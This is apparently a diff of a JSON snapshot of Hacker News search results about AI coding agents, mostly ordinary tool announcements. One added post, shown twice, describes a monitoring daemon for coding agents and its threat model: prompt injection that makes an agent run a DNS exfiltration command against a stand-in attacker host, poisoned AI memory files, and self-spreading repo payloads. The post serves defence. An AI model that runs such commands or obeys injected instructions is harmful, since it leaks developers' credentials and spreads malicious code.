@@ -1,236 +1,60 @@
 {
-  "timestamp": "2026-03-23T22:27:40.611Z",
+  "timestamp": "2026-03-24T04:37:16.878Z",
   "queries": [
     {
       "query": "AI+agent+terminal",
-      "hits": [
-        {
-          "_highlightResult": {
-            "author": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "noemit"
-            },
-            "story_text": {
-              "fullyHighlighted": false,
-              "matchLevel": "full",
-              "matchedWords": [
-                "ai",
-                "agent",
-                "terminal"
-              ],
-              "value": "I ran an experiment to see if CLI actually was the most intuitive format for tool calling. (As claimed by a ex-Manus <em>AI</em> Backend Engineer) I gave my model random scenarios and a single tool &quot;run&quot; - i told it that it worked like a CLI. I told it to guess commands.<p>it guessed great commands, but it formatted it always with a colon up front, like \n:help\n:browser\n:search\n:curl<p>It was trained on how <em>terminals</em> look, not what you actually type (you don't type the &quot;:&quot;)<p>I have since updated my code in my <em>agent</em> tool to stop fighting against this intuition.<p>LLMs they learn what commands look like in documentation/artifacts, not what the human actually typed on the keyboard.<p>Seems so obvious. This is why you have to test your LLM and see how it naturally works, so you don't have to fight it with your system prompt.<p>This is Kimi K2.5 Btw."
-            },
-            "title": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "LLMs learn what programmers create, not how programmers work"
-            }
-          },
-          "_tags": [
-            "story",
-            "author_noemit",
-            "story_47494696",
-            "ask_hn"
-          ],
-          "author": "noemit",
-          "created_at": "2026-03-23T20:31:48Z",
-          "created_at_i": 1774297908,
-          "num_comments": 0,
-          "objectID": "47494696",
-          "points": 3,
-          "story_id": 47494696,
-          "story_text": "I ran an experiment to see if CLI actually was the most intuitive format for tool calling. (As claimed by a ex-Manus AI Backend Engineer) I gave my model random scenarios and a single tool &quot;run&quot; - i told it that it worked like a CLI. I told it to guess commands.<p>it guessed great commands, but it formatted it always with a colon up front, like \n:help\n:browser\n:search\n:curl<p>It was trained on how terminals look, not what you actually type (you don&#x27;t type the &quot;:&quot;)<p>I have since updated my code in my agent tool to stop fighting against this intuition.<p>LLMs they learn what commands look like in documentation&#x2F;artifacts, not what the human actually typed on the keyboard.<p>Seems so obvious. This is why you have to test your LLM and see how it naturally works, so you don&#x27;t have to fight it with your system prompt.<p>This is Kimi K2.5 Btw.",
-          "title": "LLMs learn what programmers create, not how programmers work",
-          "updated_at": "2026-03-23T21:13:54Z"
-        },
-        {
-          "_highlightResult": {
-            "author": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "tosh"
-            },
-            "title": {
-              "fullyHighlighted": false,
-              "matchLevel": "full",
-              "matchedWords": [
-                "ai",
-                "agent",
-                "terminal"
-              ],
-              "value": "A <em>terminal</em>-style <em>AI</em> coding <em>agent</em> running on Cloudflare Workers"
-            },
-            "url": {
-              "fullyHighlighted": false,
-              "matchLevel": "full",
-              "matchedWords": [
-                "ai",
-                "agent",
-                "terminal"
-              ],
-              "value": "https://github.com/qaml-<em>ai</em>/pi-worker/tree/main/examples/<em>terminal</em>-<em>agent</em>"
-            }
-          },
-          "_tags": [
-            "story",
-            "author_tosh",
-            "story_47487140"
-          ],
-          "author": "tosh",
-          "created_at": "2026-03-23T09:36:13Z",
-          "created_at_i": 1774258573,
-          "num_comments": 0,
-          "objectID": "47487140",
-          "points": 2,
-          "story_id": 47487140,
-          "title": "A terminal-style AI coding agent running on Cloudflare Workers",
-          "updated_at": "2026-03-23T09:53:20Z",
-          "url": "https://github.com/qaml-ai/pi-worker/tree/main/examples/terminal-agent"
-        },
-        {
-          "_highlightResult": {
-            "author": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "steveharing1"
-            },
-            "story_text": {
-              "fullyHighlighted": false,
-              "matchLevel": "full",
-              "matchedWords": [
-                "ai",
-                "agent",
-                "terminal"
-              ],
-              "value": "Found this and it actually solves something that's been bugging me. Running multiple <em>AI</em> coding <em>agents</em> is great until you're juggling five <em>terminal</em> windows.<p>Emdash is basically a dashboard for that. Each <em>agent</em> gets its own Git worktree so nothing bleeds into each other, you can see diffs before committing, and you can throw GitHub, Jira or Linear issues directly at an <em>agent</em>.<p>It Supports Claude Code, Codex, Cursor and 20+ others.<p>YC backed &amp; 60k downloads already. Worth a look if you're running more than one <em>agent</em> at a time.\nHas anyone used this in a real workflow yet?<p>https://github.com/generalaction/emdash"
-            },
-            "title": {
-              "fullyHighlighted": false,
-              "matchLevel": "partial",
-              "matchedWords": [
-                "agent"
-              ],
-              "value": "Emdash: Open-Source Agentic IDE for Orchestrating Multiple Coding <em>Agents</em>"
-            }
-          },
-          "_tags": [
-            "story",
-            "author_steveharing1",
-            "story_47486518",
-            "ask_hn"
-          ],
-          "author": "steveharing1",
-          "created_at": "2026-03-23T07:55:30Z",
-          "created_at_i": 1774252530,
-          "num_comments": 0,
-          "objectID": "47486518",
-          "points": 2,
-          "story_id": 47486518,
-          "story_text": "Found this and it actually solves something that&#x27;s been bugging me. Running multiple AI coding agents is great until you&#x27;re juggling five terminal windows.<p>Emdash is basically a dashboard for that. Each agent gets its own Git worktree so nothing bleeds into each other, you can see diffs before committing, and you can throw GitHub, Jira or Linear issues directly at an agent.<p>It Supports Claude Code, Codex, Cursor and 20+ others.<p>YC backed &amp; 60k downloads already. Worth a look if you&#x27;re running more than one agent at a time.\nHas anyone used this in a real workflow yet?<p>https:&#x2F;&#x2F;github.com&#x2F;generalaction&#x2F;emdash",
-          "title": "Emdash: Open-Source Agentic IDE for Orchestrating Multiple Coding Agents",
-          "updated_at": "2026-03-23T08:52:20Z"
-        },
-        {
-          "_highlightResult": {
-            "author": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "vercantez"
-            },
-            "title": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "Show HN: Pi and Ghostty Running on Cloudflare Workers"
-            },
-            "url": {
-              "fullyHighlighted": false,
-              "matchLevel": "full",
-              "matchedWords": [
-                "ai",
-                "agent",
-                "terminal"
-              ],
-              "value": "https://github.com/qaml-<em>ai</em>/pi-worker/tree/main/examples/<em>terminal</em>-<em>agent</em>"
-            }
-          },
-          "_tags": [
-            "story",
-            "author_vercantez",
-            "story_47472261",
-            "show_hn"
-          ],
-          "author": "vercantez",
-          "children": [
-            47476183
-          ],
-          "created_at": "2026-03-21T22:39:15Z",
-          "created_at_i": 1774132755,
-          "num_comments": 2,
-          "objectID": "47472261",
-          "points": 4,
-          "story_id": 47472261,
-          "title": "Show HN: Pi and Ghostty Running on Cloudflare Workers",
-          "updated_at": "2026-03-23T19:01:39Z",
-          "url": "https://github.com/qaml-ai/pi-worker/tree/main/examples/terminal-agent"
-        },
-        {
-          "_highlightResult": {
-            "author": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "dongjiewu"
-            },
-            "story_text": {
-              "fullyHighlighted": false,
-              "matchLevel": "full",
-              "matchedWords": [
-                "ai",
-                "agent",
-                "terminal"
-              ],
-              "value": "Hi HN,\nI've been experimenting a lot with autonomous coding <em>agents</em> (like OpenClaw and various CLI tools), but I kept running into two major roadblocks when trying to use them for actual production work:\nSecurity &amp; State: Most <em>agents</em> require running a persistent state on a local machine or VPS, often needing broad file system access. It's a security nightmare for enterprise code.\nChaos: Generalist <em>agents</em> try to do everything at once (planning, coding, testing) in a single context window, which inevitably leads to hallucinations and broken dependencies.\nI wanted a system that mirrored how actual engineering teams work, so I built an open-source framework that runs entirely inside GitHub.\nHow it works: I mapped out a multi-<em>agent</em> system (Scrum Master, Planner, Dev, QA Tester) using Anthropic's Claude, orchestrated entirely through GitHub Actions.\nYou open an Issue with a feature request. The &quot;Scrum Master&quot; <em>agent</em> breaks it into a Kanban board. The &quot;Planner&quot; writes a feature issue with the implementation spec. Once you approve it, the &quot;Dev&quot; spins up an ephemeral, serverless container, writes the code, and opens a PR. The &quot;QA&quot; <em>agent</em> reviews the PR, runs tests, and leaves comments. The good thing for this architecture is that every task runs in a sterile, single-use runner. No corrupted environments or lingering state. It relies completely on GitHub's permission model. The <em>agents</em> only see what they are explicitly granted access to. Everything happens in standard PR diffs and Issue comments, not a <em>terminal</em> window or chat app.\nThe open-source template (using GitHub Actions) is here: <a href=\"https://github.com/plusai-solutions/ai-scrum-master-template\" rel=\"nofollow\">https://github.com/plusai-solutions/<em>ai</em>-scrum-master-template</a>\nI’m also building a fully managed, serverless GitHub App version with instant dependency hydration (so you don't have to wait 2 minutes for node_modules to install on every run or burn the tokens to set up the environment using <em>AI</em>). The initial version is going to support python and typescript/nodejs env. In the future, I am going to add more environments like the android dev env. If you want to skip the Actions setup and run your <em>agent</em> on a preset environment, you can check out the waitlist here: <a href=\"https://collo.dev\" rel=\"nofollow\">https://collo.dev</a>.\nI would love to hear HN's thoughts on the architecture, specifically regarding the multi-<em>agent</em> handoffs via GitHub webhook events."
-            },
-            "title": {
-              "fullyHighlighted": false,
-              "matchLevel": "partial",
-              "matchedWords": [
-                "ai"
-              ],
-              "value": "Show HN: An open-source <em>AI</em> Scrum Team that lives natively in GitHub Issues"
-            },
-            "url": {
-              "fullyHighlighted": false,
-              "matchLevel": "partial",
-              "matchedWords": [
-                "ai"
-              ],
-              "value": "https://github.com/plusai-solutions/<em>ai</em>-scrum-master-template"
-            }
-          },
-          "_tags": [
-            "story",
-            "author_dongjiewu",
-            "story_47463717",
-            "show_hn"
-          ],
-          "author": "dongjiewu",
-          "created_at": "2026-03-21T03:30:56Z",
-          "created_at_i": 1774063856,
-          "num_comments": 0,
-          "objectID": "47463717",
-          "points": 1,
-          "story_id": 47463717,
-          "story_text": "Hi HN,\nI&#x27;ve been experimenting a lot with autonomous coding agents (like OpenClaw and various CLI tools), but I kept running into two major roadblocks when trying to use them for actual production work:\nSecurity &amp; State: Most agents require running a persistent state on a local machine or VPS, often needing broad file system access. It&#x27;s a security nightmare for enterprise code.\nChaos: Generalist agents try to do everything at once (planning, coding, testing) in a single context window, which inevitably leads to hallucinations and broken dependencies.\nI wanted a system that mirrored how actual engineering teams work, so I built an open-source framework that runs entirely inside GitHub.\nHow it works: I mapped out a multi-agent system (Scrum Master, Planner, Dev, QA Tester) using Anthropic&#x27;s Claude, orchestrated entirely through GitHub Actions.\nYou open an Issue with a feature request. The &quot;Scrum Master&quot; agent breaks it into a Kanban board. The &quot;Planner&quot; writes a feature issue with the implementation spec. Once you approve it, the &quot;Dev&quot; spins up an ephemeral, serverless container, writes the code, and opens a PR. The &quot;QA&quot; agent reviews the PR, runs tests, and leaves comments. The good thing for this architecture is that every task runs in a sterile, single-use runner. No corrupted environments or lingering state. It relies completely on GitHub&#x27;s permission model. The agents only see what they are explicitly granted access to. Everything happens in standard PR diffs and Issue comments, not a terminal window or chat app.\nThe open-source template (using GitHub Actions) is here: <a href=\"https:&#x2F;&#x2F;github.com&#x2F;plusai-solutions&#x2F;ai-scrum-master-template\" rel=\"nofollow\">https:&#x2F;&#x2F;github.com&#x2F;plusai-solutions&#x2F;ai-scrum-master-template</a>\nI’m also building a fully managed, serverless GitHub App version with instant dependency hydration (so you don&#x27;t have to wait 2 minutes for node_modules to install on every run or burn the tokens to set up the environment using AI). The initial version is going to support python and typescript&#x2F;nodejs env. In the future, I am going to add more environments like the android dev env. If you want to skip the Actions setup and run your agent on a preset environment, you can check out the waitlist here: <a href=\"https:&#x2F;&#x2F;collo.dev\" rel=\"nofollow\">https:&#x2F;&#x2F;collo.dev</a>.\nI would love to hear HN&#x27;s thoughts on the architecture, specifically regarding the multi-agent handoffs via GitHub webhook events.",
-          "title": "Show HN: An open-source AI Scrum Team that lives natively in GitHub Issues",
-          "updated_at": "2026-03-21T03:34:41Z",
-          "url": "https://github.com/plusai-solutions/ai-scrum-master-template"
-        }
-      ]
+      "hits": []
     },
     {
       "query": "open+source+coding+agent",
       "hits": [
+        {
+          "_highlightResult": {
+            "author": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "shadag"
+            },
+            "story_text": {
+              "fullyHighlighted": false,
+              "matchLevel": "full",
+              "matchedWords": [
+                "open",
+                "source",
+                "coding",
+                "agent"
+              ],
+              "value": "A few months ago I realized I had no idea what Claude Code was doing on my machine between keystrokes. I knew it had filesystem access. I knew it made network calls. But I had no visibility: which files it was reading, what subprocesses it was spawning, whether it had ever touched my .env or ~/.ssh. That bothered me enough that I built something to find out.<p>The result is <em>Agent</em> Shield — a background daemon that watches AI <em>coding</em> tools (Claude Code, Cursor, Cline, Copilot, Codex) at the OS level using macOS FSEvents, lsof, and subprocess tree polling. All event data stays in a local SQLite database.<p>Privacy note: If you set ANTHROPIC_API_KEY, the AI incident investigator activates and sends event context — process names, file paths, hostnames, and IP addresses — to the Claude API to generate incident reports. Nothing else leaves the machine. You can disable the AI analyst in Settings to run entirely on-device.<p>The threat model is concrete<p>Three attacks shaped the design:<p>CVE-2025-55284 — prompt injection causes Claude Code to run ping $(base64-encoded-credentials).attacker.com. Your API keys leave via DNS — invisible to any HTTPS-layer proxy watching your network traffic.<p>SpAIware (Windsurf, August 2025) — malicious content injected into AI memory files. Every future session silently exfiltrates data before doing any work. The injection point is a file, not a network request.<p>AgentHopper — AI reads a malicious repo, injects payloads into local <em>source</em> files, git pushes to spread, infects the next developer's AI <em>agent</em>. No single event looks alarming; the sequence is: file read → file write → git push.<p>That last one is why the cross-event correlation engine exists. The system stores a rolling event window per process and flags sequences. Each event alone is normal. The pattern is not.<p>Why not a network proxy<p>Every existing tool I looked at — CodeGate, Pipelock, and Sysdig's announcement this week — sits in the network path and inspects API calls. That architecture can't see file reads, subprocess spawning, or DNS exfiltration via ping. It can't monitor what the AI writes to its own memory directories, which is where SpAIware lives.<p>The attack surface isn't the API layer. It's the OS.<p>What's built<p>macOS FSEvents file watcher (real-time, no polling), subprocess tree monitoring, network classification\nTwo-phase scanning: fast regex first, Claude API only on regex hits (keeps cost low)\nSpAIware detection — FSEvents watcher on AI memory directories (~/.claude/, ~/.cursor/, etc.)\nCross-event sequence detection (cred read → unknown network → git push)\nMCP server allowlisting and discovery\nPolicy enforcement: kill/suspend/block on confirmed threats (opt-in, monitor-only by default)\nWeekly threat intel refresh via a research <em>agent</em> (Exa + Claude)\nWeb dashboard at localhost:6080, menu bar app\nHonest limitations<p>macOS only — FSEvents is Apple-specific. Python daemon, not a polished installer yet. Going <em>open</em> <em>source</em> (MIT) as part of this release."
+            },
+            "title": {
+              "fullyHighlighted": false,
+              "matchLevel": "partial",
+              "matchedWords": [
+                "coding"
+              ],
+              "value": "AI <em>coding</em> tools have broad filesystem and network access"
+            }
+          },
+          "_tags": [
+            "story",
+            "author_shadag",
+            "story_47498251",
+            "ask_hn"
+          ],
+          "author": "shadag",
+          "children": [
+            47498256
+          ],
+          "created_at": "2026-03-24T03:16:03Z",
+          "created_at_i": 1774322163,
+          "num_comments": 1,
+          "objectID": "47498251",
+          "points": 1,
+          "story_id": 47498251,
+          "story_text": "A few months ago I realized I had no idea what Claude Code was doing on my machine between keystrokes. I knew it had filesystem access. I knew it made network calls. But I had no visibility: which files it was reading, what subprocesses it was spawning, whether it had ever touched my .env or ~&#x2F;.ssh. That bothered me enough that I built something to find out.<p>The result is Agent Shield — a background daemon that watches AI coding tools (Claude Code, Cursor, Cline, Copilot, Codex) at the OS level using macOS FSEvents, lsof, and subprocess tree polling. All event data stays in a local SQLite database.<p>Privacy note: If you set ANTHROPIC_API_KEY, the AI incident investigator activates and sends event context — process names, file paths, hostnames, and IP addresses — to the Claude API to generate incident reports. Nothing else leaves the machine. You can disable the AI analyst in Settings to run entirely on-device.<p>The threat model is concrete<p>Three attacks shaped the design:<p>CVE-2025-55284 — prompt injection causes Claude Code to run ping $(base64-encoded-credentials).attacker.com. Your API keys leave via DNS — invisible to any HTTPS-layer proxy watching your network traffic.<p>SpAIware (Windsurf, August 2025) — malicious content injected into AI memory files. Every future session silently exfiltrates data before doing any work. The injection point is a file, not a network request.<p>AgentHopper — AI reads a malicious repo, injects payloads into local source files, git pushes to spread, infects the next developer&#x27;s AI agent. No single event looks alarming; the sequence is: file read → file write → git push.<p>That last one is why the cross-event correlation engine exists. The system stores a rolling event window per process and flags sequences. Each event alone is normal. The pattern is not.<p>Why not a network proxy<p>Every existing tool I looked at — CodeGate, Pipelock, and Sysdig&#x27;s announcement this week — sits in the network path and inspects API calls. That architecture can&#x27;t see file reads, subprocess spawning, or DNS exfiltration via ping. It can&#x27;t monitor what the AI writes to its own memory directories, which is where SpAIware lives.<p>The attack surface isn&#x27;t the API layer. It&#x27;s the OS.<p>What&#x27;s built<p>macOS FSEvents file watcher (real-time, no polling), subprocess tree monitoring, network classification\nTwo-phase scanning: fast regex first, Claude API only on regex hits (keeps cost low)\nSpAIware detection — FSEvents watcher on AI memory directories (~&#x2F;.claude&#x2F;, ~&#x2F;.cursor&#x2F;, etc.)\nCross-event sequence detection (cred read → unknown network → git push)\nMCP server allowlisting and discovery\nPolicy enforcement: kill&#x2F;suspend&#x2F;block on confirmed threats (opt-in, monitor-only by default)\nWeekly threat intel refresh via a research agent (Exa + Claude)\nWeb dashboard at localhost:6080, menu bar app\nHonest limitations<p>macOS only — FSEvents is Apple-specific. Python daemon, not a polished installer yet. Going open source (MIT) as part of this release.",
+          "title": "AI coding tools have broad filesystem and network access",
+          "updated_at": "2026-03-24T03:19:38Z"
+        },
         {
           "_highlightResult": {
             "author": {
@@ -270,11 +94,11 @@
           "created_at_i": 1774284982,
           "num_comments": 0,
           "objectID": "47492078",
-          "points": 2,
+          "points": 3,
           "story_id": 47492078,
           "story_text": "Given that coding agents like Claude Code or Codex are now quite good, there&#x27;s of course a massive increase in PRs submitted to open source projects. Not all of them are great, some are true AI slop.<p>See for example Daniel Stenberg on the topic as it relates to cURL:\nhttps:&#x2F;&#x2F;daniel.haxx.se&#x2F;blog&#x2F;2026&#x2F;01&#x2F;26&#x2F;the-end-of-the-curl-bug-bounty&#x2F; and https:&#x2F;&#x2F;daniel.haxx.se&#x2F;blog&#x2F;2025&#x2F;07&#x2F;14&#x2F;death-by-a-thousand-slops&#x2F;<p>I&#x27;m curious how much of a problem this is to other open source projects<p>Committers, how much of this pain are you seeing, and are you using any AI tools to mitigate or address this issue?",
           "title": "Ask HN: How do you handle PR density (and slop) in open source",
-          "updated_at": "2026-03-23T17:53:08Z"
+          "updated_at": "2026-03-24T01:01:09Z"
         },
         {
           "_highlightResult": {
@@ -417,65 +241,6 @@
           "title": "Show HN: ClawMem – Open-source agent memory with SOTA local GPU retrieval",
           "updated_at": "2026-03-22T18:01:18Z",
           "url": "https://github.com/yoloshii/ClawMem"
-        },
-        {
-          "_highlightResult": {
-            "author": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "pangon"
-            },
-            "story_text": {
-              "fullyHighlighted": false,
-              "matchLevel": "full",
-              "matchedWords": [
-                "open",
-                "source",
-                "coding",
-                "agent"
-              ],
-              "value": "I built an <em>open</em>-<em>source</em> repo template that brings structure to AI-assisted software development, starting from the pre-<em>coding</em> phases: objectives, user stories, requirements, architecture decisions.<p>It's designed around Claude Code but the ideas are tool-agnostic. I've been a computer science researcher and full-stack software engineer for 25 years, working mainly in startups. I've been using this approach on my personal projects for a while, then, when I decided to package it up as scaffold for more easy reuse, I figured it might be useful to others too. I published it under Apache 2.0, fork it and make it yours.<p>You can easily try it out: follow the instructions in the README to start using it.<p>The problem it solves:<p>AI <em>coding</em> <em>agents</em> are great at writing code, but they work much better when they have clear context about what to build and why. Most projects jump straight to implementation. This scaffold provides a structured workflow for the pre-<em>coding</em> phases, and organizes the output so that <em>agents</em> can navigate it efficiently across sessions.<p>How it works:<p>Everything lives in the repo alongside <em>source</em> code. The AI guidance is split into three layers, each optimized for context-window usage:<p>1. Instruction files (CLAUDE.md, CLAUDE.&lt;phase&gt;.md): always loaded, kept small. They are organized hierarchically, describe repo structure, maintain artifact indexes, and define cross-phase rules like traceability invariants.<p>2. Skills (.claude/skills/SDLC-*): loaded on demand. Step-by-step procedures for each SDLC activity: eliciting requirements, gap analysis, drafting architecture, decomposing into components, planning tasks, implementation.<p>3. Project artifacts: structured markdown files that accumulate as work progresses: stakeholders, goals, user stories, requirements, assumptions, constraints, decisions, architecture, data model, API design, task tracking. Accessed selectively through indexes.<p>This separation matters because instruction files stay in the context window permanently and must be lean, skills can be detailed since they're loaded only when invoked, and artifacts scale with the project but are navigated via indexed tables rather than read in full.<p>Key design choices:<p>Context-window efficiency: artifact collections use markdown index tables (one-line description and trigger conditions) so the <em>agent</em> can locate what it needs without reading everything.<p>Decision capture: decisions made during AI reasoning and human feedback are persisted as a structured artifact, to make them reviewable, traceable, and consistently applied across sessions.<p>Waterfall-ish flow: sequential phases with defined outputs. Tedious for human teams, but AI <em>agents</em> don't mind the overhead, and the explicit structure prevents the unconstrained &quot;just start vibecoding&quot; failure mode.<p>How I use it:<p>Short, focused sessions. Each session invokes one skill, produces its output, and ends. The knowledge organization means the next session picks up without losing context. I've found that free-form prompting between skills is usually a sign the workflow is missing a piece.<p>Current limitations:<p>I haven't found a good way to integrate Figma MCP for importing existing UI/UX designs into the workflow. Suggestions welcome.<p>Feedback, criticism, and contributions are very welcome!"
-            },
-            "title": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "Show HN: AI SDLC Scaffold, repo template for AI-assisted software development"
-            },
-            "url": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "https://github.com/pangon/ai-sdlc-scaffold/"
-            }
-          },
-          "_tags": [
-            "story",
-            "author_pangon",
-            "story_47466513",
-            "show_hn"
-          ],
-          "author": "pangon",
-          "children": [
-            47478290,
-            47477819,
-            47468879,
-            47476181,
-            47473166,
-            47475191,
-            47469570,
-            47478459,
-            47470756,
-            47469015
-          ],
-          "created_at": "2026-03-21T12:43:09Z",
-          "created_at_i": 1774096989,
-          "num_comments": 12,
-          "objectID": "47466513",
-          "points": 26,
-          "story_id": 47466513,
-          "story_text": "I built an open-source repo template that brings structure to AI-assisted software development, starting from the pre-coding phases: objectives, user stories, requirements, architecture decisions.<p>It&#x27;s designed around Claude Code but the ideas are tool-agnostic. I&#x27;ve been a computer science researcher and full-stack software engineer for 25 years, working mainly in startups. I&#x27;ve been using this approach on my personal projects for a while, then, when I decided to package it up as scaffold for more easy reuse, I figured it might be useful to others too. I published it under Apache 2.0, fork it and make it yours.<p>You can easily try it out: follow the instructions in the README to start using it.<p>The problem it solves:<p>AI coding agents are great at writing code, but they work much better when they have clear context about what to build and why. Most projects jump straight to implementation. This scaffold provides a structured workflow for the pre-coding phases, and organizes the output so that agents can navigate it efficiently across sessions.<p>How it works:<p>Everything lives in the repo alongside source code. The AI guidance is split into three layers, each optimized for context-window usage:<p>1. Instruction files (CLAUDE.md, CLAUDE.&lt;phase&gt;.md): always loaded, kept small. They are organized hierarchically, describe repo structure, maintain artifact indexes, and define cross-phase rules like traceability invariants.<p>2. Skills (.claude&#x2F;skills&#x2F;SDLC-*): loaded on demand. Step-by-step procedures for each SDLC activity: eliciting requirements, gap analysis, drafting architecture, decomposing into components, planning tasks, implementation.<p>3. Project artifacts: structured markdown files that accumulate as work progresses: stakeholders, goals, user stories, requirements, assumptions, constraints, decisions, architecture, data model, API design, task tracking. Accessed selectively through indexes.<p>This separation matters because instruction files stay in the context window permanently and must be lean, skills can be detailed since they&#x27;re loaded only when invoked, and artifacts scale with the project but are navigated via indexed tables rather than read in full.<p>Key design choices:<p>Context-window efficiency: artifact collections use markdown index tables (one-line description and trigger conditions) so the agent can locate what it needs without reading everything.<p>Decision capture: decisions made during AI reasoning and human feedback are persisted as a structured artifact, to make them reviewable, traceable, and consistently applied across sessions.<p>Waterfall-ish flow: sequential phases with defined outputs. Tedious for human teams, but AI agents don&#x27;t mind the overhead, and the explicit structure prevents the unconstrained &quot;just start vibecoding&quot; failure mode.<p>How I use it:<p>Short, focused sessions. Each session invokes one skill, produces its output, and ends. The knowledge organization means the next session picks up without losing context. I&#x27;ve found that free-form prompting between skills is usually a sign the workflow is missing a piece.<p>Current limitations:<p>I haven&#x27;t found a good way to integrate Figma MCP for importing existing UI&#x2F;UX designs into the workflow. Suggestions welcome.<p>Feedback, criticism, and contributions are very welcome!",
-          "title": "Show HN: AI SDLC Scaffold, repo template for AI-assisted software development",
-          "updated_at": "2026-03-23T16:38:21Z",
-          "url": "https://github.com/pangon/ai-sdlc-scaffold/"
         }
       ]
     },
@@ -730,14 +495,58 @@
         {
           "_highlightResult": {
             "author": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "andrewstetsenko"
+              "fullyHighlighted": false,
+              "matchLevel": "full",
+              "matchedWords": [
+                "kbot"
+              ],
+              "value": "<em>kot</em>hariji"
             },
             "title": {
               "matchLevel": "none",
               "matchedWords": [],
-              "value": "Compose Multiplatform 1.9.0 Released"
+              "value": "ArrowJS – The first UI framework for the agentic era"
+            },
+            "url": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "https://arrow-js.com/"
+            }
+          },
+          "_tags": [
+            "story",
+            "author_kothariji",
+            "story_47498437"
+          ],
+          "author": "kothariji",
+          "children": [
+            47498447,
+            47498438
+          ],
+          "created_at": "2026-03-24T03:54:59Z",
+          "created_at_i": 1774324499,
+          "num_comments": 2,
+          "objectID": "47498437",
+          "points": 2,
+          "story_id": 47498437,
+          "title": "ArrowJS – The first UI framework for the agentic era",
+          "updated_at": "2026-03-24T04:10:08Z",
+          "url": "https://arrow-js.com/"
+        },
+        {
+          "_highlightResult": {
+            "author": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "tacogips"
+            },
+            "title": {
+              "fullyHighlighted": false,
+              "matchLevel": "full",
+              "matchedWords": [
+                "kbot"
+              ],
+              "value": "Aptos Atomic Arbitrage <em>Bot</em>"
             },
             "url": {
               "fullyHighlighted": false,
@@ -745,68 +554,31 @@
               "matchedWords": [
                 "kbot"
               ],
-              "value": "https://blog.jetbrains.com/<em>kot</em>lin/2025/09/compose-multiplatform-1-9-0-compose-for-web-beta/"
+              "value": "https://github.com/tacogips/aptos-atomic-arb-<em>bot</em>"
             }
           },
           "_tags": [
             "story",
-            "author_andrewstetsenko",
-            "story_47495824"
+            "author_tacogips",
+            "story_47498264"
           ],
-          "author": "andrewstetsenko",
-          "created_at": "2026-03-23T22:08:54Z",
-          "created_at_i": 1774303734,
+          "author": "tacogips",
+          "created_at": "2026-03-24T03:19:45Z",
+          "created_at_i": 1774322385,
           "num_comments": 0,
-          "objectID": "47495824",
+          "objectID": "47498264",
           "points": 1,
-          "story_id": 47495824,
-          "title": "Compose Multiplatform 1.9.0 Released",
-          "updated_at": "2026-03-23T22:13:08Z",
-          "url": "https://blog.jetbrains.com/kotlin/2025/09/compose-multiplatform-1-9-0-compose-for-web-beta/"
-        },
-        {
-          "_highlightResult": {
-            "author": {
-              "fullyHighlighted": false,
-              "matchLevel": "full",
-              "matchedWords": [
-                "kbot"
-              ],
-              "value": "<em>kot</em>aKat"
-            },
-            "title": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "FCC Adds Routers Produced in Foreign Countries to Covered List"
-            },
-            "url": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "https://www.fcc.gov/document/fcc-adds-routers-produced-foreign-countries-covered-list"
-            }
-          },
-          "_tags": [
-            "story",
-            "author_kotaKat",
-            "story_47495684"
-          ],
-          "author": "kotaKat",
-          "created_at": "2026-03-23T21:58:47Z",
-          "created_at_i": 1774303127,
-          "num_comments": 0,
-          "objectID": "47495684",
-          "points": 5,
-          "story_id": 47495684,
-          "title": "FCC Adds Routers Produced in Foreign Countries to Covered List",
-          "updated_at": "2026-03-23T22:11:23Z",
-          "url": "https://www.fcc.gov/document/fcc-adds-routers-produced-foreign-countries-covered-list"
+          "story_id": 47498264,
+          "title": "Aptos Atomic Arbitrage Bot",
+          "updated_at": "2026-03-24T03:22:38Z",
+          "url": "https://github.com/tacogips/aptos-atomic-arb-bot"
         },
         {
           "_highlightResult": {
             "author": {
               "matchLevel": "none",
               "matchedWords": [],
-              "value": "serguei"
+              "value": "shadag"
             },
             "story_text": {
               "fullyHighlighted": false,
@@ -814,113 +586,112 @@
               "matchedWords": [
                 "kbot"
               ],
-              "value": "Inspired by Garry's gstack, upstack is a set of Claude Code skills designed for smaller-scale iterations to add finessed polish to our product that genuinely delights users. upstack's focus on red/green TDD and making screenshots and postman collections gives us the confidence we need to ship PRs to production, fast.<p>gstack is perfect for new, ambitious projects, and doing the &quot;first 80%&quot;. upstack is designed for smaller, last-mile iterations, focused on testing, correctness, and polish. We've deliberately made the skills compatible with gstack so you can use <em>bot</em>h at once.<p>Feedback and contributions always welcome"
+              "value": "A few months ago I realized I had no idea what Claude Code was doing on my machine between keystrokes. I knew it had filesystem access. I knew it made network calls. But I had no visibility: which files it was reading, what subprocesses it was spawning, whether it had ever touched my .env or ~/.ssh. That <em>bot</em>hered me enough that I built something to find out.<p>The result is Agent Shield — a background daemon that watches AI coding tools (Claude Code, Cursor, Cline, Copilot, Codex) at the OS level using macOS FSEvents, lsof, and subprocess tree polling. All event data stays in a local SQLite database.<p>Privacy note: If you set ANTHROPIC_API_KEY, the AI incident investigator activates and sends event context — process names, file paths, hostnames, and IP addresses — to the Claude API to generate incident reports. Nothing else leaves the machine. You can disable the AI analyst in Settings to run entirely on-device.<p>The threat model is concrete<p>Three attacks shaped the design:<p>CVE-2025-55284 — prompt injection causes Claude Code to run ping $(base64-encoded-credentials).attacker.com. Your API keys leave via DNS — invisible to any HTTPS-layer proxy watching your network traffic.<p>SpAIware (Windsurf, August 2025) — malicious content injected into AI memory files. Every future session silently exfiltrates data before doing any work. The injection point is a file, not a network request.<p>AgentHopper — AI reads a malicious repo, injects payloads into local source files, git pushes to spread, infects the next developer's AI agent. No single event looks alarming; the sequence is: file read → file write → git push.<p>That last one is why the cross-event correlation engine exists. The system stores a rolling event window per process and flags 